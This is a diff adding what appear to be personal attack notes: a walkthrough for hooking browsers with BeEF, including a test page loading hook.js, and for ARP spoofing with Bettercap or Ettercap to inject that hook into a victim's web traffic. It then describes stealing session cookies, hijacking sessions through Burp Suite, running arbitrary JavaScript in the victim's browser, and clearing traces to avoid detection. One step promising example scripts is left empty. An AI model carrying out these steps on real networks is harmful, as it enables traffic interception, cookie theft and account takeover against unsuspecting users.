@@ -1,0 +1,92 @@
+sudo apt install beef-xss
+sudo beef-xss ( give password - can be given once )
+open web ui
+username : beef
+
+file name : vuln.html used
+<html>
+<head></head>
+<body>
+<h1> Hello </h1>
+<script src="http://127.0.0.1:3000/hook.js"></script>
+</body>
+</html>
+
+file:///home/kali/vuln.html
+
+commands -> browser -> get cookie -> execute -> see results in module results history
+commands -> misc -> raw js -> execute -> see changes in firefox
+
+
+commands for bettercap:
+
+sudo bettercap -iface eth0
+set arp.spoof.targets<meta ip>
+arp.spoof.on
+set http.proxy.injectjs "http://<kali ip/beef ip/address>:3000/hook.js"
+set http.proxy on 
+
+
+
+
+Step 2: Set Up MITM Attack (Using Ettercap or Bettercap)
+Before injecting the BeEF hook, you need to intercept traffic.
+
+Option 1: Using Ettercap for ARP Spoofing
+1. Enable IP forwarding:
+echo 1 > /proc/sys/net/ipv4/ip_forward
+2. Start Ettercap in graphical mode:
+sudo ettercap -G
+3. Select Sniff > Unified Sniffing
+4. Choose the target interface (e.g., eth0 or wlan0).
+5. Go to Hosts > Scan for Hosts
+6. Add the victim and gateway to the target list.
+7. Start ARP poisoning: Mitm > ARP poisoning > Sniff remote connections
+8. Inject BeEF Hook (Manually inject the JavaScript in HTTP responses).
+
+Option 2: Using Bettercap
+1. Start Bettercap:
+sudo bettercap -iface eth0
+2. Enable ARP Spoofing:
+set arp.spoof.targets <Victim_IP>
+arp.spoof on
+3. Inject BeEF Hook:
+set http.proxy.injectjs "http://<Attacker_IP>:3000/hook.js"
+set http.proxy on
+
+
+
+Step 3: Exploiting the Victim with BeEF
+Once the victim opens a non-HTTPS website, their browser gets hooked to BeEF.
+Verify Hooked Browsers
+1. In the BeEF Web UI, go to Hooked Browsers.
+2. The victim’s browser should appear under Online Browsers.
+
+
+
+Step 4: Steal Session Cookies
+1. Go to Commands tab in BeEF.
+2. Select Browser > Get Cookies.
+3. Click Execute to retrieve active session cookies.
+
+Step 5: Hijack the Session (Pass Cookies to Burp Suite)
+If the website doesn’t use HTTPOnly cookies, you can impersonate the victim:
+1. Copy the stolen session cookie.
+2. Open Burp Suite > Proxy > Intercept.
+3. Modify an HTTP request by adding the session cookie.
+Cookie: sessionid=stolen_session_cookie
+4. Forward the request to access the victim’s session.
+
+
+Step 6: Exploit the Victim Further by Executing JavaScript Payloads
+Use BeEF’s JavaScript execution module to run malicious scripts:
+1. Select the hooked browser.
+2. Go to Commands > Browser > Execute JavaScript.
+3. Inject scripts like:
+
+
+Step 7: Clearing Traces to Prevent Detection
+1. Stop ARP Spoofing:
+ettercap -C
+2. Flush ARP cache on the victim’s machine:
+arp -d <Gateway_IP>
